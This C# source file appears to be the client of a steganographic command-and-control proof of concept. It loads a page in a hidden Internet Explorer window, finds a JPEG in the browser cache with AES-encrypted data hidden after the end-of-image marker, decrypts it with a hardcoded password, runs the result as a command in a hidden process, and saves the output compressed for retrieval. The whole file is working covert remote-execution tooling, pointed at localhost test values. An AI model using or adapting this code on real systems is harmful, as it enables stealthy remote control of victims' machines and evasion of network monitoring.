using System;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;
using System.Text;
using System.Collections;
using System.Threading;
using System.Security.Cryptography;
using System.Diagnostics;

namespace tDiscoverer
{
    class Program
    {
        // change values with test web page and fresh salt obtain from Uploader
        private static string _malurl = "http://127.0.0.1/projects/test/test.html";
        private static string _pageref = "http://127.0.0.1/projects/test/";
        private static int _offset = 0;
        private static string _password = "Pas5pr@se";
        private static string _salt = "";

        #region Constats
        private const string DEFAULT_HASH_ALGORITHM = "SHA1";
        private const int PASSWORD_ITERATIONS = 1000;
        private const int DEFAULT_KEY_SIZE = 256;

        #endregion

        #region Methods
        /**
         *  Retrieve file from IE cache for visited web page
         * */
        private static List<String> getIECacheElem(String urlFilter, String fileExtensionFilter)
        {
            List<string> myFiles = IECache.getUrlEntriesInHistory(urlFilter, fileExtensionFilter);
            List<string> imgPathList = new List<String>();
            foreach (string actualPathName in myFiles)
            {
                string realPath = IECache.GetPathForCachedFile(actualPathName);
                imgPathList.Add(realPath);
            }
            return imgPathList;
        }

        /*
         * Convert image bytes to 16-bit integer in big endian 
         * */
        private static int i16(byte[] c)
        {
            return (c[0] << 8) | c[1];
        }

        /**
         * Check EOI at possition (offset-2)
         * */
        private static bool checkEOIAtOffset(string imgpath)
        {
            string marker = "FFD9"; // EOI
            bool flag = false;

            int chunkSize = 2;
            byte[] chunk = new byte[chunkSize];
            int i16value = 0;
            string hex = "";

            using (FileStream fileReader = new FileStream(imgpath, FileMode.Open, FileAccess.Read))
            {
                BinaryReader binaryReader = new BinaryReader(fileReader);
                int offsetcheck = _offset - 2;
                binaryReader.BaseStream.Seek(offsetcheck, SeekOrigin.Begin);
                binaryReader.Read(chunk, 0, chunkSize);
                i16value = i16(chunk);
                hex = i16value.ToString("X4");
                if (hex.Equals(marker)) { flag = true; }
                Console.WriteLine("\nMarker: {0}", hex);
            }
            return flag;
        }

        private static byte[] extractChipertextFromImg(string imgpath)
        {
            using (var file = File.OpenRead(imgpath))
            {
                int chunksize = (int)file.Length - _offset;
                byte[] chunk = new byte[chunksize];

                file.Position = _offset;
                for (int i = 0; i < chunksize; i++)
                {
                    chunk[i] = (byte)file.ReadByte();
                }
                return chunk;
            }
        }

        /**
          * AES 256 bits dencrypt with salt
        **/
        public static byte[] Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes, byte[] saltBytes)
        {
            byte[] plainTextBytes = null;
            ICryptoTransform decryptor = null;

            PasswordDeriveBytes key = new PasswordDeriveBytes(passwordBytes, saltBytes, DEFAULT_HASH_ALGORITHM, PASSWORD_ITERATIONS);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = DEFAULT_KEY_SIZE;
            AES.Mode = CipherMode.CBC;

            // Get Key And IV From Password And Salt
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            decryptor = AES.CreateDecryptor();

            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write);

            cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);

            cryptoStream.FlushFinalBlock();
            plainTextBytes = memoryStream.ToArray();

            memoryStream.Close();
            cryptoStream.Close();

            return plainTextBytes;
        }

        #region String compression
        /**
          * ZIP and UNZIP methos for string compression
        **/
        public static void CopyTo(Stream src, Stream dest)
        {
            byte[] bytes = new byte[4096];

            int cnt;

            while ((cnt = src.Read(bytes, 0, bytes.Length)) != 0)
            {
                dest.Write(bytes, 0, cnt);
            }
        }

        public static byte[] Zip(string str)
        {
            var bytes = Encoding.UTF8.GetBytes(str);

            using (var msi = new MemoryStream(bytes))
            using (var mso = new MemoryStream())
            {
                using (var gs = new GZipStream(mso, CompressionMode.Compress))
                {
                    //msi.CopyTo(gs);
                    CopyTo(msi, gs);
                }

                return mso.ToArray();
            }
        }

        public static string Unzip(byte[] bytes)
        {
            using (var msi = new MemoryStream(bytes))
            using (var mso = new MemoryStream())
            {
                using (var gs = new GZipStream(msi, CompressionMode.Decompress))
                {
                    //gs.CopyTo(mso);
                    CopyTo(gs, mso);
                }

                return Encoding.UTF8.GetString(mso.ToArray());
            }
        }
        #endregion

        #endregion

        #region Main
        static void Main(string[] args)
        {

			#region Get HTTP request
			/**
			* Make a request to page by nternet Explorer and put into cache all page content
			* */
			// Open Internet Explorer
			Console.WriteLine("MAKE HTTP GET REQUEST: START");
			SHDocVw.InternetExplorer ie = new SHDocVw.InternetExplorer();
			SHDocVw.IWebBrowserApp wb = (SHDocVw.IWebBrowserApp)ie;
			//set IE windows not visible
			wb.Visible = false;

			object noValue = System.Reflection.Missing.Value;
			wb.Navigate(_malurl, ref noValue, ref noValue, ref noValue, ref noValue);

			// Get access to its document.
			while (wb.Busy) { Thread.Sleep(1000); }
			ie.Quit();
			Console.WriteLine("MAKE HTTP GET REQUEST: STOP");
			Console.ReadLine();
			#endregion

			#region Get images and select by filesize
			/**
			* Get images from IE cache  at least as large as the offset specified in the tweet
			* */
			Console.WriteLine("GET IMAGE FROM IE CACHE: START");
			ArrayList matchFile = new ArrayList();
			List<string> imgsCachePath = getIECacheElem(_pageref, "jpg");
			foreach (string imgPath in imgsCachePath)
			{
				try
				{
					if (File.Exists(imgPath))
					{
						using (FileStream fileWriter = new FileStream(imgPath, FileMode.Open, FileAccess.Read))
						{
							int fileSize = (int)fileWriter.Length;
							if (fileSize >= _offset)
							{
								Console.WriteLine("\nImage Path: {0}\nFile Size: {1}\n", imgPath, fileSize);
								matchFile.Add(imgPath);
							}
						}
					}
				}
				// if process fail than exit without signal
				catch (IOException) { Environment.Exit(0); }
			}

			Console.WriteLine("GET IMAGE FROM IE CACHE: STOP");
			Console.ReadLine();
			#endregion

            #region Load image and extract cyphertext
            /**
             * Check images for EOI marker at (offset-2)
             **/
            Console.WriteLine("CHECK IMAGES FOR EOI MARKER AT (OFFSET-2): START");
            int pos = 0;
            bool match = false;
            for (int i = 0; i < matchFile.Count; i++)
            {
                string imagepath = (string)matchFile[i];
                if (checkEOIAtOffset(imagepath))
                {
                    pos = i;
                    match = true;
                }
            }

            string stegaimg = "";
            if (match)
            {
                stegaimg = (string)matchFile[pos];
                Console.WriteLine("Selected IMG:\n{0}\n", stegaimg);
            }
            else
            {
                Console.WriteLine("No Match!");
                Environment.Exit(0);
            }

            Console.WriteLine("CHECK IMAGES FOR EOI MARKER AT (OFFSET-2): STOP");
            Console.ReadLine();

            /**
              * Extract chipertext from image
            **/
            Console.WriteLine("EXTRACT CHIPERTEXT: START");
            // Get the bytes of the string
            byte[] passwordBytes = Encoding.ASCII.GetBytes(_password);
            byte[] saltBytes = Encoding.ASCII.GetBytes(_salt);
            byte[] chipertext = extractChipertextFromImg(stegaimg);

            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] plaintext = Decrypt(chipertext, passwordBytes, saltBytes);

            Console.WriteLine("\nDecrypt : {0}\n", Encoding.ASCII.GetString(plaintext));
            Console.WriteLine("EXTRACT CHIPERTEXT: STOP");
            Console.ReadLine();
            #endregion

            #region Command Execution and std_out grabbing
            /**
              * Execution of win command into hiden command prompt and std_out grabbing
             **/
            string wincmq = Encoding.ASCII.GetString(plaintext);

            ProcessStartInfo procStartInfo = new ProcessStartInfo(wincmq);
            procStartInfo.RedirectStandardError = false;
            procStartInfo.RedirectStandardOutput = true; // Set true to redirect the process stdout to the Process.StandardOutput StreamReader
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;          // Do not create the black window

            // Create a process, assign its ProcessStartInfo and start it
            Process proc = new Process();
            proc.StartInfo = procStartInfo;
            proc.Start();

            // Dump the o utput to the log file
            string std_out = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            FileStream file_writer = null;
            // Save uncompressed string into a file 
            string file_out = "output.txt";
            file_writer = new FileStream(file_out, FileMode.OpenOrCreate, FileAccess.Write);
            StreamWriter streamWriter = new StreamWriter(file_writer);
            streamWriter.Write(std_out);
            Console.WriteLine("\nNO UPX File Size: {0}", file_writer.Length);
            file_writer.Close();

            // Save compressed string into a file 
            byte[] std_out_upx = Zip(std_out); // String compression

            file_out = "output_upx.txt";
            file_writer = new FileStream(file_out, FileMode.OpenOrCreate, FileAccess.Write);
            file_writer.Write(std_out_upx, 0, std_out_upx.Length);
            Console.WriteLine("\nUPX File Size: {0}", file_writer.Length);
            file_writer.Close();

            Console.ReadLine();
            #endregion
        }
        #endregion
    }
}